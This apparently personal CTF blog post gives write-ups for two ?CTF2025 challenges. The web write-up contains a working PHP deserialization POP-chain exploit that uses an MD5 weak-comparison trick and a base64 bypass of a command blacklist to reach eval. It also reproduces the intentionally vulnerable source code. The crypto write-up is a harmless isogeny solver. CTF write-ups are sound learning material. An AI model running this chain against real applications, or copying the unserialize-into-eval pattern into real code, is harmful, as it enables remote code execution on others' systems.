<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>?CTF2025 week4部分WP | D&#39;b8Gr的小站~</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    <meta name="keywords" content="debu8ger, D'b8Gr" />
  
  <meta name="description" content="打了?CTF2025,拿了第47，遗憾离场~">
<meta property="og:type" content="article">
<meta property="og:title" content="?CTF2025 week4部分WP">
<meta property="og:url" content="https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/index.html">
<meta property="og:site_name" content="D&#39;b8Gr的小站~">
<meta property="og:description" content="打了?CTF2025,拿了第47，遗憾离场~">
<meta property="og:locale">
<meta property="og:image" content="https://incldue.github.io/images/week4_1.png">
<meta property="article:published_time" content="2025-10-31T16:00:00.000Z">
<meta property="article:modified_time" content="2025-11-01T06:09:00.482Z">
<meta property="article:author" content="debu8ger">
<meta property="article:tag" content="比赛个人WP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://incldue.github.io/images/week4_1.png">
  
  
    <link rel="icon" href="/static/avatar/avatar.png">
  
  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
  
<link rel="stylesheet" href="../../../../css/style.css">

  
<script src="../../../../js/pace.min.js"></script>

  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'true', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?true";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>

  
  <div style="display: none;">
    <script src="//s22.cnzz.com/z_stat.php?id=true&web_id=true" language="JavaScript"></script>
  </div>


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
      <header id="header">
    <div id="banner"></div>
    <div id="header-outer">
        <div id="header-menu" class="header-menu-pos animated">
            <div class="header-menu-container">
                <a href="../../../../index.html" class="left">
                    <span class="site-title">D&#39;b8Gr的小站</span>
                </a>
                <nav id="header-menu-nav" class="right">
                    
                    <a  href="../../../../index.html">
                        <i class="fa fa-home"></i>
                        <span>Home</span>
                    </a>
                    
                    <a  href="../../../../archives">
                        <i class="fa fa-archive"></i>
                        <span>Archives</span>
                    </a>
                    
                    <a  href="../../../../about">
                        <i class="fa fa-user"></i>
                        <span>About</span>
                    </a>
                    
                </nav>
                <a class="mobile-header-menu-button">
                    <i class="fa fa-bars"></i>
                </a>
            </div>
        </div>
        <div id="header-row">
            <div id="logo">
                <a href="../../../../index.html">
                    <img src="../../../../static/avatar/avatar0.jpg" alt="logo">
                </a>
            </div>
            <div class="header-info">
                <div id="header-title">
                    
                    <h2>
                        D&#39;b8Gr的小站
                    </h2>
                    
                </div>
                <div id="header-description">
                    
                    <h3>
                        一个CTFer的技术博客
                    </h3>
                    
                </div>
            </div>
            <nav class="header-nav">
                <div class="social">
                    
                        <a title="debu8ger" target="_blank" href="//incldue.github.io">
                            <i class="fa fa-home fa-2x"></i></a>
                    
                        <a title="Github" target="_blank" href="//github.com/incldue">
                            <i class="fa fa-github fa-2x"></i></a>
                    
                        <a title="Twitter" target="_blank" href="//x.com/JonathanHu70782">
                            <i class="fa fa-twitter fa-2x"></i></a>
                    
                </div>
            </nav>
        </div>
    </div>
</header>
      <div class="outer">
        <section id="main" class="body-wrap"><article id="post-ilovectf week4 部分WP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="post-title" itemprop="name">
      ?CTF2025 week4部分WP
    </h1>
    <div class="post-title-bar">
      <ul>
          
              <li>
                  <i class="fa fa-book"></i>
                  
                      <a href="/categories/CTF相关/">CTF相关</a>
                  
              </li>
          
        <li>
          <i class="fa fa-calendar"></i>  2025-11-01
        </li>
        <li>
          <i class="fa fa-eye"></i>
          <span id="busuanzi_value_page_pv"></span>
        </li>
      </ul>
    </div>
  

          
      </header>
    
    <div class="article-entry post-content" itemprop="articleBody">
      
            
            <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Week4-Path-to-Hero"><a href="#Week4-Path-to-Hero" class="headerlink" title="[Week4] Path to Hero"></a>[Week4] Path to Hero</h3><hr>
<p>题目描述：初出茅庐的勇者啊，你能战胜魔王，得到至宝吗？</p>
<hr>
<p>打开靶机，观察前端显示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>highlight_file(&#x27;index.php&#x27;);<br><br>Class Start<br>&#123;<br>    public $ishero;<br>    public $adventure;<br><br><br>    public function __wakeup()&#123;<br><br>        if (strpos($this-&gt;ishero, &quot;hero&quot;) !== false &amp;&amp; $this-&gt;ishero !== &quot;hero&quot;) &#123;<br>            echo &quot;&lt;br&gt;勇者啊，去寻找利刃吧&lt;br&gt;&quot;;<br><br>            return $this-&gt;adventure-&gt;sword;<br>        &#125;<br>        else&#123;<br>            echo &quot;前方的区域以后再来探索吧！&lt;br&gt;&quot;;<br>        &#125;<br>    &#125;<br>&#125;<br><br>class Sword		//MD5弱类型比较<br>&#123;<br>    public $test1;<br>    public $test2;<br>    public $go;<br><br>    public function __get($name)<br>    &#123;<br>        if ($this-&gt;test1 !== $this-&gt;test2 &amp;&amp; md5($this-&gt;test1) == md5($this-&gt;test2)) &#123;<br>            echo &quot;沉睡的利刃被你唤醒了，是时候去讨伐魔王了！&lt;br&gt;&quot;;<br>            echo $this-&gt;go;<br>        &#125; else &#123;<br>            echo &quot;Dead&quot;;<br>        &#125;<br>    &#125;<br>&#125;<br><br>class Mon3tr<br>&#123;<br>    private $result;<br>    public $end;<br><br>    public function __toString()<br>    &#123;<br>        $result = new Treasure();<br>        echo &quot;到此为止了！魔王&lt;br&gt;&quot;;<br><br>        if (!preg_match(&quot;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&quot;, $this-&gt;end)) &#123;<br>            $result-&gt;end($this-&gt;end);<br>        &#125; else &#123;<br>            echo &quot;难道……要输了吗？&lt;br&gt;&quot;;<br>        &#125;<br>        return &quot;&lt;br&gt;&quot;;<br>    &#125;<br>&#125;<br><br>class Treasure<br>&#123;<br>    public function __call($name, $arg)<br>    &#123;<br>        echo &quot;结束了？&lt;br&gt;&quot;;<br>        eval($arg[0]);<br>    &#125;<br>&#125;<br><br>if (isset($_POST[&quot;HERO&quot;])) &#123;<br>    unserialize($_POST[&quot;HERO&quot;]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>看到关键词<code>unserialize</code>以及魔术方法<code>_wakeup()、_toString()</code>得知，考察PHP的ROP链反序列化，</p>
<p>第一个类<code>Start</code>，我们让<code>$adventrue</code>为一个<code>Sword</code>对象；</p>
<p>第二个类<code>Sword</code>是典型的<strong>MD5弱类型比较(<code>==</code>比较哈希值)</strong>，我们只需让<code>$a = 240610708 &amp; $b = QNKCDZO</code>，MD5的值因为都以<code>0e</code>开头，被科学计数法处理为<code>0</code>，相等；</p>
<p>第三个类<code>Mon3tr</code>考察<strong>黑名单绕过(正则过滤の绕过)</strong>，可以使用<code>base64编码</code>绕过；</p>
<p>第四个类<code>Treasure</code>则考察<strong>RCE</strong>，任意代码执行。</p>
<p>构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ishero</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adventure</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sword</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$go</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mon3tr</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Treasure</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arg</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$mon3tr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mon3tr</span>();<br><span class="hljs-variable">$mon3tr</span>-&gt;end = <span class="hljs-string">&quot;print_r(scandir(&#x27;/&#x27;));&quot;</span>;<br><span class="hljs-variable">$sword</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sword</span>();<br><span class="hljs-variable">$sword</span>-&gt;test1 = <span class="hljs-string">&quot;240610708&quot;</span>;<br><span class="hljs-variable">$sword</span>-&gt;test2 = <span class="hljs-string">&quot;QNKCDZO&quot;</span>;<br><span class="hljs-variable">$sword</span>-&gt;go = <span class="hljs-variable">$mon3tr</span>;<br><span class="hljs-variable">$start</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$start</span>-&gt;ishero = <span class="hljs-string">&quot;herox&quot;</span>;<br><span class="hljs-variable">$start</span>-&gt;adventure = <span class="hljs-variable">$sword</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$start</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A22%3A%22print_r%28scandir%28%27%2F%27%29%29%3B%22%3B%7D%7D%7D</code></p>
<p>先调用类似<code>ls /</code>命令查看文件夹，得到：</p>
<p><img src="/images/week4_1.png" alt="week4_1"></p>
<p>然后再用<code>eval()函数，再base64编码</code>，改<code>$mon3tr-&gt;end = &quot;print_r(scandir(&#39;/&#39;));&quot;;</code>为<code>$mon3tr-&gt;end = &quot;eval(base64_decode(&#39;cGFzc3RocnUoJ2NhdCAvZmxhZycpOw==&#39;));&quot;;</code>，执行php代码，得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A56%3A%22eval%28base64_decode%28%27cGFzc3RocnUoJ2NhdCAvZmxhZycpOw%3D%3D%27%29%29%3B%22%3B%7D%7D%7D</code>，</p>
<p>POST请求，最终得到flag：flag{e24449c0-752e-42fe-8e9a-cff80fe7e221}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Week4-Myneighbors"><a href="#Week4-Myneighbors" class="headerlink" title="[Week4] Myneighbors"></a>[Week4] Myneighbors</h3><hr>
<p>题目描述：我是我的邻居？<a target="_blank" rel="noopener" href="https://eprint.iacr.org/2019/1321.pdf">https://eprint.iacr.org/2019/1321.pdf</a></p>
<hr>
<p>题目代码为sagemath格式的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> magical_num, flag<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib <br><br>p = <span class="hljs-number">431</span><br>F.&lt;i&gt; = GF(p^<span class="hljs-number">2</span>, modulus = x^<span class="hljs-number">2</span> + <span class="hljs-number">1</span>)<br>E = EllipticCurve(j=F(magical_num))<br><span class="hljs-keyword">assert</span> E.is_supersingular()<br><br>P = E(<span class="hljs-number">0</span>).division_points(<span class="hljs-number">2</span>)[<span class="hljs-number">1</span>:]<br>neighbors = []<br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>((P))):<br>    phi = E.isogeny(P[idx])<br>    EE = phi.codomain()<br>    neighbors.append(EE.j_invariant())<br><br><span class="hljs-keyword">assert</span> E.j_invariant() <span class="hljs-keyword">in</span> neighbors<br><br>P = E(<span class="hljs-number">0</span>).division_points(<span class="hljs-number">3</span>)[<span class="hljs-number">1</span>:]<br>shuffle(P)<br><br>phi = E.isogeny(P[<span class="hljs-number">0</span>])<br>E = phi.codomain()<br>H = hashlib.md5(<span class="hljs-built_in">str</span>(E.j_invariant()).encode()).hexdigest().encode()<br>key, iv = H[:<span class="hljs-number">16</span>], H[<span class="hljs-number">16</span>:]<br><br>aes = AES.new(key, AES.MODE_CBC, iv)<br>cipher = aes.encrypt(pad(flag, <span class="hljs-number">16</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;cipher: <span class="hljs-subst">&#123;cipher.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br><span class="hljs-comment">#cipher: 49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0</span><br></code></pre></td></tr></table></figure>

<p>可以看到<code>assert E.j_invariant() in neighbors</code>，E的<strong>j-invariant</strong>在自己的<strong>2-isogeny</strong>邻居中，</p>
<p>同时，从题目给的文献里得知：</p>
<ol>
<li>在<code>2-isogeny</code>图中，每个<code>j-invariant</code>通常有<strong>3</strong>个邻居；</li>
<li>特殊的<code>j-invariant</code>包括<code>p=431时，j 属于&#123;0, 2, 242&#125;</code>和<code>j=0&amp;&amp;j=242时，在图中有自环</code>。</li>
</ol>
<p>因此，我们的攻击思路为：</p>
<ol>
<li><code>magical_num</code>必须是有自环的；</li>
<li>尝试<code>j 属于&#123;0, 242&#125;</code>;</li>
<li>枚举所有可能的<code>3-isogeny</code>目标曲线；</li>
<li>对<code>p=431</code>，每个曲线则有4个<code>3-isogeny</code>邻居。</li>
</ol>
<p>综上，EXP为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> hashlib<br><br>p = <span class="hljs-number">431</span><br>F.&lt;i&gt; = GF(p^<span class="hljs-number">2</span>, modulus = x^<span class="hljs-number">2</span> + <span class="hljs-number">1</span>)<br><br>cipher_hex = <span class="hljs-string">&#x27;49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0&#x27;</span><br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher_hex)<br>candidates = [F(<span class="hljs-number">0</span>), F(<span class="hljs-number">4</span>), F(<span class="hljs-number">242</span>)]<br><br><span class="hljs-keyword">for</span> magical_num <span class="hljs-keyword">in</span> candidates:<br>    <span class="hljs-keyword">try</span>:<br>        E = EllipticCurve(j=magical_num)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> E.is_supersingular():<br>            <span class="hljs-keyword">continue</span><br>            <br>        P = E(<span class="hljs-number">0</span>).division_points(<span class="hljs-number">2</span>)[<span class="hljs-number">1</span>:]<br>        neighbors = []<br>        <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(P)):<br>            phi = E.isogeny(P[idx])<br>            EE = phi.codomain()<br>            neighbors.append(EE.j_invariant())<br>        <br>        <span class="hljs-keyword">if</span> E.j_invariant() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> neighbors:<br>            <span class="hljs-keyword">continue</span><br>            <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found magical_num: <span class="hljs-subst">&#123;magical_num&#125;</span>&quot;</span>)<br>        <br>        P3 = E(<span class="hljs-number">0</span>).division_points(<span class="hljs-number">3</span>)[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">for</span> P_point <span class="hljs-keyword">in</span> P3:<br>            <span class="hljs-keyword">try</span>:<br>                phi = E.isogeny(P_point)<br>                E_new = phi.codomain()<br>                j_inv = E_new.j_invariant()<br>                H = hashlib.md5(<span class="hljs-built_in">str</span>(j_inv).encode()).hexdigest().encode()<br>                key, iv = H[:<span class="hljs-number">16</span>], H[<span class="hljs-number">16</span>:]<br>                aes = AES.new(key, AES.MODE_CBC, iv)<br>                <span class="hljs-keyword">try</span>:<br>                    plaintext = unpad(aes.decrypt(cipher), <span class="hljs-number">16</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> plaintext <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;FLAG&#123;&#x27;</span> <span class="hljs-keyword">in</span> plaintext:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Success with j-invariant: <span class="hljs-subst">&#123;j_inv&#125;</span>&quot;</span>)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;plaintext.decode()&#125;</span>&quot;</span>)<br>                        exit()<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>                <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag not found - trying all j-invariants from the paper...&quot;</span>)<br>all_j_invariants = [<br>    F(<span class="hljs-number">0</span>), F(<span class="hljs-number">4</span>), F(<span class="hljs-number">316</span>), F(<span class="hljs-number">107</span>), F(<span class="hljs-number">419</span>), F(<span class="hljs-number">234</span>), F(<span class="hljs-number">102</span>), F(<span class="hljs-number">241</span>), F(<span class="hljs-number">143</span>), <br>    F(<span class="hljs-number">358</span>), F(<span class="hljs-number">125</span>), F(<span class="hljs-number">19</span>), F(<span class="hljs-number">242</span>), F(<span class="hljs-number">61</span>), F(<span class="hljs-number">381</span>), F(<span class="hljs-number">319</span>), F(<span class="hljs-number">356</span>), F(<span class="hljs-number">150</span>), <br>    F(<span class="hljs-number">422</span>), F(<span class="hljs-number">67</span>), F(<span class="hljs-number">189</span>),<br>    F(<span class="hljs-number">81</span>*i + <span class="hljs-number">65</span>), F(<span class="hljs-number">67</span>*i + <span class="hljs-number">304</span>), F(<span class="hljs-number">350</span>*i + <span class="hljs-number">65</span>), F(<span class="hljs-number">132</span>*i + <span class="hljs-number">315</span>), F(<span class="hljs-number">125</span>*i + <span class="hljs-number">426</span>),<br>    F(<span class="hljs-number">306</span>*i + <span class="hljs-number">426</span>), F(<span class="hljs-number">299</span>*i + <span class="hljs-number">315</span>), F(<span class="hljs-number">325</span>*i + <span class="hljs-number">379</span>), F(<span class="hljs-number">222</span>*i + <span class="hljs-number">118</span>), F(<span class="hljs-number">106</span>*i + <span class="hljs-number">379</span>),<br>    F(<span class="hljs-number">42</span>*i + <span class="hljs-number">141</span>), F(<span class="hljs-number">209</span>*i + <span class="hljs-number">118</span>), F(<span class="hljs-number">389</span>*i + <span class="hljs-number">141</span>), F(<span class="hljs-number">364</span>*i + <span class="hljs-number">304</span>), F(<span class="hljs-number">344</span>*i + <span class="hljs-number">190</span>),<br>    F(<span class="hljs-number">87</span>*i + <span class="hljs-number">190</span>)<br>]<br><br><span class="hljs-keyword">for</span> j_inv <span class="hljs-keyword">in</span> all_j_invariants:<br>    H = hashlib.md5(<span class="hljs-built_in">str</span>(j_inv).encode()).hexdigest().encode()<br>    key, iv = H[:<span class="hljs-number">16</span>], H[<span class="hljs-number">16</span>:]<br>    aes = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">try</span>:<br>        plaintext = unpad(aes.decrypt(cipher), <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> plaintext <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;FLAG&#123;&#x27;</span> <span class="hljs-keyword">in</span> plaintext <span class="hljs-keyword">or</span> plaintext.startswith(<span class="hljs-string">b&#x27;flag&#x27;</span>) <span class="hljs-keyword">or</span> plaintext.isascii():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found with j-invariant: <span class="hljs-subst">&#123;j_inv&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;plaintext.decode()&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br><span class="hljs-comment">#flag：flag&#123;I_@m_4_n31gh80r_0f_my53lf&#125;</span><br></code></pre></td></tr></table></figure>

<!--more-->
            <div class="post-copyright">
    <div class="content">
        <p>最后更新： 2025年11月01日 14:09</p>
        <p>原始链接： <a class="post-url" href="" title="?CTF2025 week4部分WP">https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/</a></p>
        <footer>
            <a href="https://incldue.github.io">
                <img src="../../../../static/avatar/avatar0.jpg" alt="debu8ger">
                debu8ger
            </a>
        </footer>
    </div>
</div>

      
        
            

        
    </div>
    <footer class="article-footer">
        
        
<div class="post-share">
    <a href="javascript:;" id="share-sub" class="post-share-fab">
        <i class="fa fa-share-alt"></i>
    </a>
    <div class="post-share-list" id="share-list">
        <ul class="share-icons">
          <li>
            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/&title=《?CTF2025 week4部分WP》 — D'b8Gr的小站~&pic=https://incldue.github.io/static/avatar/avatar0.jpg" data-title="微博">
              <i class="fa fa-weibo"></i>
            </a>
          </li>
          <li>
            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
              <i class="fa fa-weixin"></i>
            </a>
          </li>
          <li>
            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/&title=《?CTF2025 week4部分WP》 — D'b8Gr的小站~&source=打了?CTF2025,拿了第47，遗憾离场~" data-title="QQ">
              <i class="fa fa-qq"></i>
            </a>
          </li>
          <li>
            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/" data-title="Facebook">
              <i class="fa fa-facebook"></i>
            </a>
          </li>
          <li>
            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《?CTF2025 week4部分WP》 — D'b8Gr的小站~&url=https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/&via=https://incldue.github.io" data-title="Twitter">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
          <li>
